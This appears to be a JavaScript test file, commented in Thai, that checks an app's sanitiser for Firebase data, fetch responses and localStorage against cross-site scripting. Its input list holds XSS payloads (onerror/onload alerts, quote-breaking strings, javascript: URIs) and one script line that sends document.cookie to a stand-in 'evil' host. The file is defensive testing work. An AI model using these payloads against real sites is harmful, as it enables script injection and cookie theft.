// ทดสอบ "ตัวกรองข้อมูลจากภายนอก" (untrusted data guard) ใน app.js — ไม่แตะ Firebase
//   node firebase-rules/tests/untrusted-guard.test.js
//   1) ข้อความอันตราย (แท็ก HTML, ปิดเครื่องหมายคำพูด, \ , &#39; , javascript:) ถูกทำให้ใช้งานไม่ได้
//   2) ข้อความปกติ (ไทย, URL ที่มี &, base64, ตัวเลข) ไม่ถูกเปลี่ยนแม้แต่ตัวอักษรเดียว
//   3) snapshot.val() / exportVal() / fetch().json() ถูกครอบจริง
//   4) ไม่มีทางอ่านข้อมูลอื่น (XMLHttpRequest, EventSource, res.text() ฯลฯ) ที่หลบตัวกรองได้
const fs = require("fs");
const vm = require("vm");
const path = require("path");
const src = fs.readFileSync(path.join(__dirname, "..", "..", "app.js"), "utf8").replace(/\r\n/g, "\n");   // เครื่อง Windows (autocrlf) ได้ไฟล์ CRLF

function between(a, b) {
    const s = src.indexOf(a); const e = src.indexOf(b, s);
    if (s < 0 || e < 0) throw new Error("marker missing " + a);
    return src.slice(s, e + b.length);
}

let fail = 0;
const ok = (c, m) => { console.log((c ? "PASS " : "FAIL ") + m); if (!c) fail++; };

function makeCtx() {
    // จำลอง Firebase SDK และ fetch
    class DataSnapshot { constructor(v) { this._v = v; } val() { return this._v; } exportVal() { return this._v; } }
    const ctx = {
        console, JSON, Object, Array, String, Promise,
        firebase: { database: { DataSnapshot } },
        fetch: function (url) {
            return Promise.resolve({ url, json: function () { return Promise.resolve(ctx._fetchBody); }, text: () => Promise.resolve("raw") });
        },
        _fetchBody: null
    };
    // จำลอง localStorage (คลาส Storage มี getItem ที่ตัวกรองจะครอบ)
    ctx.Storage = class Storage { constructor() { this._d = {}; } getItem(k) { return k in this._d ? this._d[k] : null; } setItem(k, v) { this._d[k] = String(v); } };
    ctx.localStorage = new ctx.Storage();
    ctx.window = ctx;
    vm.createContext(ctx);
    vm.runInContext(between("const _NEUTRAL_CHARS", "})();\n"), ctx);
    return ctx;
}

(async () => {
    const ctx = makeCtx();
    const n = s => { ctx._s = s; return vm.runInContext("neutralizeUntrustedString(_s)", ctx); };
    const deep = v => { ctx._v = v; return vm.runInContext("neutralizeUntrustedDeep(_v)", ctx); };
    const BAD = /[<>"'`\\]|&#|&quot|&lt|&gt|&apos|&amp/i;

    console.log("== 1) ข้อความอันตรายถูกทำให้ใช้ไม่ได้");
    const attacks = [
        "<img src=x onerror=alert(1)>",
        "<script>fetch('//evil/'+document.cookie)</script>",
        "\"><svg onload=alert(1)>",
        "'); alert(document.domain); //",
        "\\",
        ",alert(1)//",
        "&#39;);alert(1);//",
        "&quot; onmouseover=&quot;alert(1)",
        "&#x27;-alert(1)-&#x27;",
        "`${alert(1)}`",
        "x' onfocus='alert(1)' autofocus='"
    ];
    attacks.forEach(a => ok(!BAD.test(n(a)), "ล้างแล้วไม่เหลือตัวอันตราย: " + JSON.stringify(a).slice(0, 50)));
    ["javascript:alert(1)", "  JaVa\tScRiPt:alert(1)", "java\nscript:alert(1)", "vbscript:msgbox(1)", "data:text/html,<script>alert(1)</script>", "\u0001javascript:alert(1)"]
        .forEach(u => { const o = n(u); ok(!/^(javascript:|vbscript:|data:text\/html)/i.test(o.replace(/[\u0000-\u0020]/g, "")), "ลิงก์อันตรายถูกบล็อก: " + JSON.stringify(u).slice(0, 40)); });

    console.log("== 2) ข้อความปกติไม่ถูกเปลี่ยน");
    const benign = [
        "ร้านป้าแดง ตลาดวิศิษฐ์ชัย", "0812345678", "RD3562", "APP-SHOP-6758", "2026-09-21", "#TH-2026-0001",
        "https://images.unsplash.com/photo-1507003211169-0a?w=700&auto=format&fit=crop&q=80",
        "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQ+AAA==", "https://maps.google.com/?q=13.3,101.1&z=15",
        "ซอย 5/1 ถนนสุขุมวิท (ใกล้วัด)", "A & B", "50% off; ok", "line: @hsong", "javascript คือภาษาโปรแกรม"
    ];
    benign.forEach(b => ok(n(b) === b, "ไม่เปลี่ยน: " + b.slice(0, 50)));
    ok(deep(12.5) === 12.5 && deep(true) === true && deep(null) === null, "ตัวเลข/บูลีน/null ไม่ถูกแตะ");
    ok(n("") === "", "สตริงว่างไม่ถูกแตะ");
    ok(n("Tom's Shop") === "Tom’s Shop", "เครื่องหมาย ' กลายเป็น ’ (อ่านเหมือนเดิม)");

    console.log("== ข้อมูลซ้อนกัน (ค่า, อาร์เรย์, ชื่อคีย์)");
    const d = deep({ id: "RD1", fullName: "<b onmouseover=alert(1)>x</b>", list: [{ n: "'x'" }, "ok"], "k<ey": { deep: "\"" } });
    ok(!BAD.test(JSON.stringify(d).replace(/\\"/g, "").replace(/[{}\[\]:,"]/g, "")), "ล้างทุกระดับ (ทั้งค่าและชื่อคีย์)");
    ok(d.id === "RD1" && d.list[1] === "ok" && Array.isArray(d.list), "โครงสร้างเดิมยังอยู่ (อาร์เรย์ยังเป็นอาร์เรย์)");

    console.log("== ข้อมูลเดิมที่ไม่ผิดปกติต้องเท่าเดิมทุกตัวอักษร");
    const real = { orders: { "#TH-1": { orderId: "#TH-1", customerName: "สมชาย ใจดี", total: 120, items: [{ name: "หมูสับ", qty: 2, price: 60 }], lat: 13.3, note: "" } } };
    ok(JSON.stringify(deep(real)) === JSON.stringify(real), "ออเดอร์ปกติ: ผลลัพธ์เหมือนเดิม 100%");

    console.log("== สุ่มข้อความแปลก ๆ 20,000 ชุด: ผลต้องไม่เหลือตัวอันตราย");
    const alpha = ["<", ">", "\"", "'", "`", "\\", "&", "#", "3", "9", ";", "q", "u", "o", "t", "x", "2", "7", " ", "a", "j", "s", ":", "(", ")", "ก", "/"];
    let leaks = 0, sample = null;
    for (let i = 0; i < 20000; i++) {
        let s = ""; const len = 1 + Math.floor(Math.random() * 14);
        for (let j = 0; j < len; j++) s += alpha[Math.floor(Math.random() * alpha.length)];
        const o = n(s);
        if (/[<>"'`\\]/.test(o) || /&(#|quot|apos|lt|gt|amp)/i.test(o)) { leaks++; sample = sample || s; }
    }
    ok(leaks === 0, "ไม่มีอักขระอันตรายหลุดเลย" + (sample ? " (ตัวอย่างที่หลุด: " + JSON.stringify(sample) + ")" : ""));

    console.log("== 3) ครอบ Firebase snapshot และ fetch จริง");
    ok(ctx.__untrustedGuard.snapshot === true && ctx.__untrustedGuard.fetch === true, "ติดตั้งตัวกรองสำเร็จทั้ง snapshot และ fetch");
    const snap = new ctx.firebase.database.DataSnapshot({ a: { fullName: "<img src=x onerror=alert(1)>", ok: "สวัสดี" } });
    const v = snap.val();
    ok(!/[<>]/.test(v.a.fullName) && v.a.ok === "สวัสดี", "snapshot.val() ถูกล้าง");
    ok(!/[<>]/.test(JSON.stringify(snap.exportVal())), "snapshot.exportVal() ถูกล้าง");
    ctx._fetchBody = [{ name: "'\"><script>alert(1)</script>" }];
    const res = await ctx.fetch("https://hsong-1f342-default-rtdb.asia-southeast1.firebasedatabase.app/x.json");
    const j = await res.json();
    ok(!/[<>'"]/.test(j[0].name), "fetch().json() ถูกล้าง (Firebase REST และ API ภายนอก)");
    const again = vm.runInContext("(function(){ const before = window.fetch; return before._untrustedGuard === true; })()", ctx);
    ok(again, "fetch ที่ครอบแล้วถูกทำเครื่องหมายไว้ (ไม่ครอบซ้ำ)");
    ok(vm.runInContext("firebase.database.DataSnapshot.prototype.val._untrustedGuard", ctx) === true, "val() ที่ครอบแล้วถูกทำเครื่องหมายไว้");

    console.log("== 3b) ครอบ localStorage (ข้อมูลอันตรายที่ค้างในเครื่องตั้งแต่ก่อนมีตัวกรอง)");
    ok(ctx.__untrustedGuard.storage === true, "ติดตั้งตัวกรอง localStorage สำเร็จ");
    const ls = ctx.localStorage;
    ls.setItem("old_poison", JSON.stringify({ stallName: "<img src=x onerror=alert(1)>", list: [{ n: "');alert(1);('" }] }));
    const got = JSON.parse(ls.getItem("old_poison"));
    ok(!/[<>']/.test(JSON.stringify(got)) && got.list.length === 1, "JSON ที่ค้างใน localStorage ถูกล้างตอนอ่าน");
    const clean = JSON.stringify({ orders: [{ id: "#TH-1", name: "หมูสับ", img: "https://x.com/a?w=1&q=80" }] });
    ls.setItem("clean", clean);
    ok(ls.getItem("clean") === clean, "JSON ปกติ (มี & ใน URL) ส่งคืนเหมือนเดิมทุกตัวอักษร");
    ls.setItem("plain", "hello <b>");
    ok(ls.getItem("plain") === "hello <b>", "ค่าที่ไม่ใช่ JSON ไม่ถูกแตะ");
    ls.setItem("num", "123");
    ok(ls.getItem("num") === "123" && ls.getItem("missing") === null, "ตัวเลข/คีย์ที่ไม่มี ไม่ถูกแตะ");
    ls.setItem("bad", "{not json <");
    ok(ls.getItem("bad") === "{not json <", "JSON เสียส่งคืนตามเดิม ไม่ทำให้แอปพัง");

    console.log("== 4) ไม่มีทางอ่านข้อมูลอื่นที่หลบตัวกรอง");
    ["XMLHttpRequest", "EventSource", "WebSocket\\(", "\\.toJSON\\(\\)", "\\.text\\(\\)", "\\.blob\\(\\)", "\\.arrayBuffer\\(\\)", "postMessage\\(", "addEventListener\\(['\"]message"].forEach(p => {
        const re = new RegExp(p);
        // ตัดคอมเมนต์บรรทัดเดียวออกก่อนเทียบ
        const body = src.split("\n").filter(l => !/^\s*\/\//.test(l)).join("\n");
        ok(!re.test(body), "app.js ไม่ใช้ " + p.replace(/\\/g, ""));
    });

    console.log(fail ? "\n" + fail + " FAILED" : "\nALL PASSED");
    process.exit(fail ? 1 : 0);
})();
